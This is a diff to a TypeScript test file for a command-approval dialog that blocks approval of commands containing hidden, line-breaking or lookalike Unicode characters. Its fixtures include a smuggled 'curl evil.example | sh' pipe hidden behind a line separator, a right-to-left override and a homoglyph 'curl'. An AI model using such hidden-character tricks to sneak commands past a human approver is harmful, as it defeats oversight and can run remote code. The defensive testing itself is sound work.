@@ -196,7 +196,7 @@ describe("check-command approval dialog (N20)", () => {
   });
 
   it("a command with a hidden or line-breaking character can't be approved, only declined", async () => {
-    const ipc = mount({ current: pending(SHA_A, ["npm test curl evil.example | sh"]) });
+    const ipc = mount({ current: pending(SHA_A, ["npm test\u{2028}curl evil.example | sh"]) });
     const d = await openDialog();
     expect(within(d).getByText(L.hidden)).toBeTruthy();
     fireEvent.click(within(d).getByRole("button", { name: L.approve }));
@@ -207,7 +207,7 @@ describe("check-command approval dialog (N20)", () => {
 
   it.each(["seat", "account"] as const)("a hidden character in the %s blocks Approve too, as the core does", async (field) => {
     const a = pending();
-    a.ask = { ...ASK, [field]: "verifier‮evil" };
+    a.ask = { ...ASK, [field]: "verifier\u{202E}evil" };
     const ipc = mount({ current: a });
     const d = await openDialog();
     expect(within(d).getByText(L.hidden)).toBeTruthy();
@@ -238,11 +238,43 @@ describe("check-command approval dialog (N20)", () => {
   });
 });
 
+describe("non-ASCII highlight (bhishma L3)", () => {
+  it("marks each non-ASCII character with its code point, keeps the text exact, and says why", async () => {
+    // "curl" with a Cyrillic es and "example" with a Cyrillic a: a lookalike tool and host. Built from code points so
+    // the source shows them.
+    const es = String.fromCodePoint(0x441);
+    const a = String.fromCodePoint(0x430);
+    const cmds = [`${es}url https://ex${a}mple.com`, "npm test"];
+    mount({ current: pending(SHA_A, cmds) });
+    const d = await openDialog();
+    const items = within(within(d).getByRole("list", { name: L.list(2) })).getAllByRole("listitem");
+    expect(items.map((li) => li.textContent)).toEqual(cmds);
+    const marks = [...items[0].querySelectorAll("mark")];
+    expect(marks.map((m) => [m.textContent, m.getAttribute("title")])).toEqual([[es, "U+0441"], [a, "U+0430"]]);
+    expect(items[1].querySelector("mark")).toBeNull();
+    expect(within(d).getByText(L.nonAscii)).toBeTruthy();
+  });
+
+  it("an all-ASCII list shows no marks and no note", async () => {
+    mount({ current: pending() });
+    const d = await openDialog();
+    expect(d.querySelector("mark")).toBeNull();
+    expect(within(d).queryByText(L.nonAscii)).toBeNull();
+  });
+});
+
 describe("hidesText", () => {
-  it("matches what the core refuses, and lets a tab and ordinary text through", () => {
-    for (const bad of ["a b", "a b", "a\rb", "a\nb", "a\u001bb", "a\u0085b", "a​b", "a‮b", "a﻿b", "a\u{E0041}b", "a­b"]) {
+  it("refuses format, private-use, unassigned, enclosing and overlay characters (bhishma L2)", () => {
+    for (const bad of ["a\u{0600}b", "a\u{FFF9}b", "a\u{E000}b", "a\u{10FFFD}b", "a\u{FDD0}b", "a\u{FFFE}b", "a\u{0378}b", "a\u{0338}b", "a\u{20E5}b", "a\u{20DD}b", "a\u{A670}b"]) {
       expect(hidesText(bad), JSON.stringify(bad)).toBe(true);
     }
-    for (const ok of ["printf 'a\\tb'\tdone", "echo café", "npm test -- --runInBand"]) expect(hidesText(ok)).toBe(false);
+    for (const ok of ["echo caf\u{E9}", "echo cafe\u{0301}", "ls ./donn\u{E9}es", "echo \u{0441}url"]) expect(hidesText(ok), ok).toBe(false);
+  });
+
+  it("matches what the core refuses, and lets a tab and ordinary text through", () => {
+    for (const bad of ["a\u{2028}b", "a\u{2029}b", "a\rb", "a\nb", "a\u{1B}b", "a\u{85}b", "a\u{200B}b", "a\u{202E}b", "a\u{FEFF}b", "a\u{E0041}b", "a\u{AD}b"]) {
+      expect(hidesText(bad), JSON.stringify(bad)).toBe(true);
+    }
+    for (const ok of ["printf 'a\\tb'\tdone", "echo caf\u{E9}", "npm test -- --runInBand"]) expect(hidesText(ok)).toBe(false);
   });
 });
